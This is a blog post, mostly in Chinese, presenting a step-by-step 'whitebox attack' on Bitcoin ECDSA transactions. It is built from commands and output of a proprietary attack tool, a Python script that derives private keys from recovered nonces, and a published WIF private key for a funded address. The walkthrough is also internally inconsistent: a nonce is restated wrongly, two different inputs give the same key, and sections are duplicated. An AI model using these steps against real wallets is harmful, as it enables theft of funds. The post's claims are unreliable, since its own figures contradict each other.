
<!-- wp:image {"id":1660} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-52-1024x268.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1660"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>我們發起了這次攻擊<code>-tool whitebox_attack</code>並將結果保存到一個文件中<code>SecretKey.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>現在看到成功的結果，打開文件<code>SecretKey.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1662} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-53-1024x376.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1662"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0xdd3fee317f873f30a38a54c2566a07cb7682612e3564996017b993b5416fcddc

RawTX = 01000000015c55f614688adf76c9186a89af07d4aca2aba8d612d6b445e8bd500bef21dac62b0000006a47304402207f252f8be450d3a7573c9a69ae96392e23dd58d7dc0ca3b835b9760f4056772d0220712f483ef5f8b98166fa673c6a8eb8379249cb1a3a7842d1d877096fca773677012102506c7593c4e301c2729dbfc46b2959c7a92f6f20c672b6d0feff9c5b6a567cf9ffffffff01c6020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>我們看到一個銘文<code>"Deployments ECDSA"</code>，表示比特幣區塊鏈交易中存在嚴重漏洞。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>SecretKey значение в формате HEX, это и есть наш секретный ключ "K" (NONCE):</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>K = 0xdd3fee317f873f30a38a54c2566a07cb7682612e3564996017b993b5416fcddc</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>讓我們用<em>Python</em>腳本檢查一下<code>point2gen.py</code></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>讓我們使用ECPy</strong></a>橢圓曲線庫：</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>現在讓我們通過指定運行腳本<code>&nbsp;секретный ключ "K" (NONCE)</code>：</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python3 point2gen.py 0xdd3fee317f873f30a38a54c2566a07cb7682612e3564996017b993b5416fcddc</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1663} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-54-1024x87.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1663"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>(0x7f252f8be450d3a7573c9a69ae96392e23dd58d7dc0ca3b835b9760f4056772d , 0xe4eedac586ca23bf57a44e5de537e097ea28205a4eeef93c51fe2ee2b783280e)</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>EC (secp256k1)&nbsp;</code>檢查具有簽名值的點的坐標<code>R</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R = 0x7f252f8be450d3a7573c9a69ae96392e23dd58d7dc0ca3b835b9760f4056772d
S = 0x712f483ef5f8b98166fa673c6a8eb8379249cb1a3a7842d1d877096fca773677
Z = 0x2a3395f1143929b17c0dd24f89fc6eceee3d099c2286b7d1f147886ca30e5a7d</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R          =    0x7f252f8be450d3a7573c9a69ae96392e23dd58d7dc0ca3b835b9760f4056772d
point2gen  =   (0x7f252f8be450d3a7573c9a69ae96392e23dd58d7dc0ca3b835b9760f4056772d , 0xe4eedac586ca23bf57a44e5de537e097ea28205a4eeef93c51fe2ee2b783280e)
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><code>ВСЕ ВЕРНО!</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>K = 0xdd3fee317f873f30a38a54c2566a07cb7682612e3564996017b993b5416fcddc</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>現在知道了密鑰，我們可以得到比特幣錢包的私鑰：<code>15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>讓我們使用&nbsp;<em>Python</em>腳本：&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; 獲取私鑰</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>讓我們打開代碼並添加簽名的所有值<code><strong>K, R, S, Z</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0xdd3fee317f873f30a38a54c2566a07cb7682612e3564996017b993b5416fcddc
R = 0x7f252f8be450d3a7573c9a69ae96392e23dd58d7dc0ca3b835b9760f4056772d
S = 0x712f483ef5f8b98166fa673c6a8eb8379249cb1a3a7842d1d877096fca773677
Z = 0x2a3395f1143929b17c0dd24f89fc6eceee3d099c2286b7d1f147886ca30e5a7d


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2>該腳本將使用以下公式計算私鑰：</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>讓我們運行腳​​本：</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python3 calculate.py</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1664} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-55.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1664"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>PrivKey = 16f2eaf0c267f036f926d0b1332c05f244427c65ce70a11b96842bf1a8221301</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>讓我們打開<strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">bitaddress</a></strong>並檢查：</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ADDR: 15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz
WIF:  KwzKYYfPTrdAZA5m1kxs4WAjSWTuJRnD2ANKHGUugibgFBP4oDSG
HEX:  16f2eaf0c267f036f926d0b1332c05f244427c65ce70a11b96842bf1a8221301</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1693} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/003-1.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1693"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:embed {"url":"https://www.blockchain.com/btc/address/15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://www.blockchain.com/btc/address/15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz
</div></figure>
<!-- /wp:embed -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><code>Приватный ключ найден!</code></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":1667,"linkDestination":"custom"} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-57-1024x476.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1667"/><figcaption class="wp-element-caption"><strong><a href="https://www.blockchain.com/btc/address/15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz" target="_blank" rel="noreferrer noopener"><code>www.blockchain.com/btc/address/15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz</code></a></strong></figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>BALANCE: $ 657.68</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em>丟失 BTC 硬幣的潛在威脅在於比特幣區塊鏈交易的嚴重漏洞，因此我們強烈建議大家始終更新軟件並僅使用經過驗證的設備。</em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong><a href="https://btc1.trezor.io/tx/1bd43bdeb2d76f0c24eef5abddfdc439f02406375ccc02d44299715b057bdf7e" target="_blank" rel="noreferrer noopener">通過詳細的密碼分析，我們還在1bd43bdeb2d76f0c24eef5abddfdc439f02406375ccc02d44299715b057bdf7e</a></strong>中發現了一個針對相同比特幣地址的嚴重漏洞<strong><code>&nbsp;TXID:</code></strong><strong><a href="https://btc1.trezor.io/tx/1bd43bdeb2d76f0c24eef5abddfdc439f02406375ccc02d44299715b057bdf7e" target="_blank" rel="noreferrer noopener"></a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>為攻擊準備 RawTX</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong><a href="https://btc1.trezor.io/address/15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz" target="_blank" rel="noreferrer noopener">15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/1bd43bdeb2d76f0c24eef5abddfdc439f02406375ccc02d44299715b057bdf7e"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/1bd43bdeb2d76f0c24eef5abddfdc439f02406375ccc02d44299715b057bdf7e
</div></figure>
<!-- /wp:embed --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":1670} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-58-1024x138.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1670"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>RawTX = 0100000001090090e02de381ea337027a92b40cf9ea64c49f3ff4a5dc6e86514cbb3e6fbba210000006b483045022100abfd0edfab28bfdaffd134487cbba8baba8796ae5da45cf5bdd8b73f221edfc902201b52781a8e038c877146d0671638be48da3a0e946589ebdc3bb876d351292ddc012102506c7593c4e301c2729dbfc46b2959c7a92f6f20c672b6d0feff9c5b6a567cf9ffffffff0180020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000
</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2>現在我們需要從所有易受攻擊的交易中獲取所有的 R、S、Z 值</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>讓我們使用 breakECDSA.py 腳本</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python2 breakECDSA.py 0100000001090090e02de381ea337027a92b40cf9ea64c49f3ff4a5dc6e86514cbb3e6fbba210000006b483045022100abfd0edfab28bfdaffd134487cbba8baba8796ae5da45cf5bdd8b73f221edfc902201b52781a8e038c877146d0671638be48da3a0e946589ebdc3bb876d351292ddc012102506c7593c4e301c2729dbfc46b2959c7a92f6f20c672b6d0feff9c5b6a567cf9ffffffff0180020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000
</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1671} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-59-1024x213.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1671"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R = 0xabfd0edfab28bfdaffd134487cbba8baba8796ae5da45cf5bdd8b73f221edfc9
S = 0x1b52781a8e038c877146d0671638be48da3a0e946589ebdc3bb876d351292ddc
Z = 0x4ff2faf760c97ea590a3c7deec2698695e9559d629d1e73271623fd07cfbeffa</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>要從易受攻擊的 ECDSA 簽名交易中獲取密鑰，讓我們將數據添加<code>RawTX</code>到文本文檔並將其保存為文件<code>RawTX.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>0100000001090090e02de381ea337027a92b40cf9ea64c49f3ff4a5dc6e86514cbb3e6fbba210000006b483045022100abfd0edfab28bfdaffd134487cbba8baba8796ae5da45cf5bdd8b73f221edfc902201b52781a8e038c877146d0671638be48da3a0e946589ebdc3bb876d351292ddc012102506c7593c4e301c2729dbfc46b2959c7a92f6f20c672b6d0feff9c5b6a567cf9ffffffff0180020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2><code>-tool whitebox_attack</code>使用軟件啟動<code>“ATTACKSAFE SOFTWARE”</code></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>./attacksafe -tool whitebox_attack -open RawTX.txt -save SecretKey.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1673} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-60-1024x258.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1673"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>我們發起了這次攻擊<code>-tool whitebox_attack</code>並將結果保存到一個文件中<code>SecretKey.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>現在看到成功的結果，打開文件<code>SecretKey.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1674} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-61-1024x376.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1674"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0xe7d9497ff0bab6f5dbbed781bc75be51ad98bbd70304e4def52c64e90b9822c2

RawTX = 0100000001090090e02de381ea337027a92b40cf9ea64c49f3ff4a5dc6e86514cbb3e6fbba210000006b483045022100abfd0edfab28bfdaffd134487cbba8baba8796ae5da45cf5bdd8b73f221edfc902201b52781a8e038c877146d0671638be48da3a0e946589ebdc3bb876d351292ddc012102506c7593c4e301c2729dbfc46b2959c7a92f6f20c672b6d0feff9c5b6a567cf9ffffffff0180020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>我們看到一個銘文<code>"Deployments ECDSA"</code>，表示比特幣區塊鏈交易中存在嚴重漏洞。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>SecretKey значение в формате HEX, это и есть наш секретный ключ "K" (NONCE):</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>K = 0xdd3fee317f873f30a38a54c2566a07cb7682612e3564996017b993b5416fcddc</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>讓我們用<em>Python</em>腳本檢查一下<code>point2gen.py</code></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>讓我們使用ECPy</strong></a>橢圓曲線庫：</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>現在讓我們通過指定運行腳本<code>&nbsp;секретный ключ "K" (NONCE)</code>：</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python3 point2gen.py 0xe7d9497ff0bab6f5dbbed781bc75be51ad98bbd70304e4def52c64e90b9822c2</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1675} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-62-1024x85.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1675"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>(0xabfd0edfab28bfdaffd134487cbba8baba8796ae5da45cf5bdd8b73f221edfc9 , 0x9d29d467ba4eaea83ab268250f3101b200f66cebbbd0871c2a4c8af9d8730962)</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>EC (secp256k1)&nbsp;</code>檢查具有簽名值的點的坐標<code>R</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R = 0xabfd0edfab28bfdaffd134487cbba8baba8796ae5da45cf5bdd8b73f221edfc9
S = 0x1b52781a8e038c877146d0671638be48da3a0e946589ebdc3bb876d351292ddc
Z = 0x4ff2faf760c97ea590a3c7deec2698695e9559d629d1e73271623fd07cfbeffa</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R          =    0xabfd0edfab28bfdaffd134487cbba8baba8796ae5da45cf5bdd8b73f221edfc9
point2gen  =   (0xabfd0edfab28bfdaffd134487cbba8baba8796ae5da45cf5bdd8b73f221edfc9 , 0x9d29d467ba4eaea83ab268250f3101b200f66cebbbd0871c2a4c8af9d8730962)</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><code>ВСЕ ВЕРНО!</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>K = 0xe7d9497ff0bab6f5dbbed781bc75be51ad98bbd70304e4def52c64e90b9822c2</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>現在知道了密鑰，我們可以得到比特幣錢包的私鑰：<code>15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>讓我們使用&nbsp;<em>Python</em>腳本：&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; 獲取私鑰</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>讓我們打開代碼並添加簽名的所有值<code><strong>K, R, S, Z</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0xe7d9497ff0bab6f5dbbed781bc75be51ad98bbd70304e4def52c64e90b9822c2
R = 0xabfd0edfab28bfdaffd134487cbba8baba8796ae5da45cf5bdd8b73f221edfc9
S = 0x1b52781a8e038c877146d0671638be48da3a0e946589ebdc3bb876d351292ddc
Z = 0x4ff2faf760c97ea590a3c7deec2698695e9559d629d1e73271623fd07cfbeffa


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2>該腳本將使用以下公式計算私鑰：</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>讓我們運行腳​​本：</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python3 calculate.py</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1676} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/image-63.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1676"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>PrivKey = 16f2eaf0c267f036f926d0b1332c05f244427c65ce70a11b96842bf1a8221301</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>讓我們打開<strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">bitaddress</a></strong>並檢查：</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ADDR: 15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz
WIF:  KwzKYYfPTrdAZA5m1kxs4WAjSWTuJRnD2ANKHGUugibgFBP4oDSG
HEX:  16f2eaf0c267f036f926d0b1332c05f244427c65ce70a11b96842bf1a8221301</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1694} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/003-2.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1694"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:embed {"url":"https://www.blockchain.com/btc/address/15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://www.blockchain.com/btc/address/15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz
</div></figure>
<!-- /wp:embed -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><code>Приватный ключ найден!</code></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":1679,"linkDestination":"custom"} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/003-addr.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1679"/><figcaption class="wp-element-caption"><strong><a href="https://www.blockchain.com/btc/address/15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz" target="_blank" rel="noreferrer noopener"><code>www.blockchain.com/btc/address/15wGrVZpLjfg47ZG43hHuJtrfdQyNFYGNz</code></a></strong></figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>BALANCE: $ 657.68</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong><a href="https://github.com/demining/CryptoDeepTools/tree/main/16WhiteBoxAttack" target="_blank" rel="noreferrer noopener">來源</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://attacksafe.ru/software" target="_blank" rel="noreferrer noopener">攻擊安全軟件</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener">電報：https://t.me/cryptodeeptech</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://youtu.be/dLy74McEFTg" target="_blank" rel="noreferrer noopener">視頻素材：https://youtu.be/dLy74McEFTg</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://cryptodeep.ru/whitebox-attack" target="_blank" rel="noreferrer noopener">來源：https://cryptodeep.ru/whitebox-attack</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":1685} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/11/023-1-1024x576.png" alt="我們根據Eli Biham和Adi Shamir的研究方案，對比特幣進行差分錯誤白盒攻擊，提取秘鑰" class="wp-image-1685"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>&nbsp;<a href="https://cryptodeep.ru/category/%d0%ba%d1%80%d0%b8%d0%bf%d1%82%d0%be%d0%b0%d0%bd%d0%b0%d0%bb%d0%b8%d0%b7/">密碼分析</a></p>
<!-- /wp:paragraph -->
